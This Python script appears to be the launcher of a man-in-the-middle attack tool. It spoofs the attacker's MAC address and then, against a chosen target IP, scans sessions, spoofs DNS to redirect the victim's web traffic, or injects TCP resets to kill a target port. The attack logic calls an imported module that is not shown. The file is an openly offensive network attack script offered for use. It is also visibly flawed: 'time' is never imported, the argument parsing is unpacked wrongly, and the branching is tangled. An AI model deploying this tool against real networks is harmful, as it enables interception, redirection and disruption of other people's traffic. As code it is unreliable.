#!/bin/python

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import os
import sys
import random
import argparse
import core.config
import core.utils as utils
import core.mitm as mitm

(G, W) = (utils.G, utils.W)

def parse_arguments():
    """ parse arguments """
    parser = argparse.ArgumentParser(description='Usage: %prog [options] dev')
    parser.add_argument('-1', '--sessions-scan', action='store_const', const=1, dest='mode',
                        help='Sessions scan mode')
    parser.add_argument('-2', '--dns-spoof', action='store_const', const=2, dest='mode',
                        help='Dns spoofing')
    parser.add_argument('-x', '--spoof', action='store_const', const=1, dest='spoof',
                        help='Spoof mode, generate a fake MAC address to be used during attack')
    parser.add_argument('-m', dest='macaddr',
                        help='Mac address octet prefix (could be an entire MAC address in the'
                        'form AA:BB:CC:DD:EE:FF)')
    parser.add_argument('-M', dest='manufacturer',
                        help='Manufacturer of the wireless device, for retrieving a manufactur '
                        'based prefix for MAC spoof')
    parser.add_argument('-s', dest='source',
                        help='Source ip address (e.g. a class C address like 192.168.1.150) '
                        'usually the router address')
    parser.add_argument('-t', dest='target',
                        help='Target ip address (e.g. a class C address like 192.168.1.150)')
    parser.add_argument('-p', dest='port',
                        help='Target port to shutdown')
    parser.add_argument('-a', dest='host',
                        help='Target host that will be redirect while navigating on target machine')
    parser.add_argument('-r', dest='redir',
                        help='Target redirection that will be fetched instead of host on the '
                        'target machine')
    parser.add_argument('-v', '--verbose', action='store_const', const=1, dest='verbosity',
                        help='Verbose output mode')
    parser.add_argument('-d', '--dotted', action='store_const', const=1, dest='dotted',
                        help='Dotted output mode')

    return parser.parse_args()

# check privileges (low level socket and pcap require root)
if not os.geteuid() == 0:
    sys.exit('You must be root.')

(OPTIONS, ARGS) = parse_arguments()

print("")

if len(ARGS) != 1:
    print(sys.argv[0] + ' -h for help')
    print('[!] Must specify interface')
    exit()

MAC_ADDR = ""
ORIGINAL_MAC_ADDR = utils.get_mac_addr(ARGS[0])
CHANGED = False

if not OPTIONS.source:
    try:
        OPTIONS.source = utils.get_default_gateway_linux()
    except:
        print("[!] Unable to retrieve default gateway, please specify one using -s option")
        sys.exit(2)

if not OPTIONS.target:
    print('[!] Must specify target address')
    exit()

if OPTIONS.verbosity == 1:
    core.config.verbose = True

if OPTIONS.dotted == 1:
    core.config.dotted = True

if OPTIONS.spoof == 1:

    if not OPTIONS.macaddr and not OPTIONS.manufacturer:

        CHOICE = input('[+] In order to change MAC address ' + G + ARGS[0] + W
                       + ' must be temporary put down. Proceed?[y/n] ')

        if CHOICE == 'y':
            MAC_ADDR = utils.fake_mac_address([], 1)
            try:
                utils.change_mac(ARGS[0], MAC_ADDR)
                CHANGED = True
            except:
                pass
            else:
                MAC_ADDR = ORIGINAL_MAC_ADDR

        elif OPTIONS.macaddr and not OPTIONS.manufacturer:

            if utils.parse_mac(OPTIONS.macaddr) != utils.parse_mac(ORIGINAL_MAC_ADDR):
                MAC_ADDR = utils.fake_mac_address(utils.mac_to_hex(OPTIONS.macaddr))
                CHOICE = input('[+] In order to change MAC address ' + G + ARGS[0] + W
                               + ' must be temporary put down. Proceed?[y/n] ')

                if CHOICE == 'y':
                    try:
                        utils.change_mac(ARGS[0], MAC_ADDR)
                        CHANGED = True
                    except:
                        pass
                    else:
                        MAC_ADDR = ORIGINAL_MAC_ADDR

                else:
                    MAC_ADDR = OPTIONS.macaddr

            elif OPTIONS.manufacturer:
                MACS = utils.get_manufacturer(OPTIONS.manufacturer)
                MAC_ADDR = utils.fake_mac_address(utils.mac_to_hex(random.choice(MACS)))
                CHOICE = input('[+] In order to change MAC address ' + G + ARGS[0] + W
                               + ' must be temporary put down. Proceed?[y/n] ')

                if CHOICE == 'y':
                    try:
                        utils.change_mac(ARGS[0], MAC_ADDR)
                        CHANGED = True
                    except:
                        pass
                    else:
                        MAC_ADDR = ORIGINAL_MAC_ADDR

                print("[+] Waiting for wireless reactivation..")

                if OPTIONS.mode == 1 or OPTIONS.mode == 2:
                    time.sleep(10)
                else:
                    time.sleep(4)

            else:
                if not OPTIONS.macaddr:
                    MAC_ADDR = ORIGINAL_MAC_ADDR
                else:
                    MAC_ADDR = OPTIONS.macaddr

print("[+] Using " + G + MAC_ADDR + W + " MAC address")
print("[+] Set " + G + OPTIONS.source + W + " as default gateway")

if OPTIONS.mode == 1:
    mitm.get_sessions(ARGS[0], OPTIONS.target)

elif OPTIONS.mode == 2:
    mitm.dns_spoof(ARGS[0],
                   utils.parse_mac(MAC_ADDR),
                   OPTIONS.source, OPTIONS.target,
                   OPTIONS.host, OPTIONS.redir)

else:

    if OPTIONS.port:
        mitm.rst_inject(ARGS[0],
                        utils.parse_mac(MAC_ADDR),
                        OPTIONS.source, OPTIONS.target,
                        port=OPTIONS.port)
    else:
        mitm.rst_inject(ARGS[0], utils.parse_mac(MAC_ADDR), OPTIONS.source, OPTIONS.target)

if CHANGED is True:
    try:
        time.sleep(1)
        print("[+] Resetting MAC address to original value " + G + ORIGINAL_MAC_ADDR + W
              + " for device " + G + ARGS[0] + W)
        utils.change_mac(ARGS[0], ORIGINAL_MAC_ADDR)
    except:
        pass
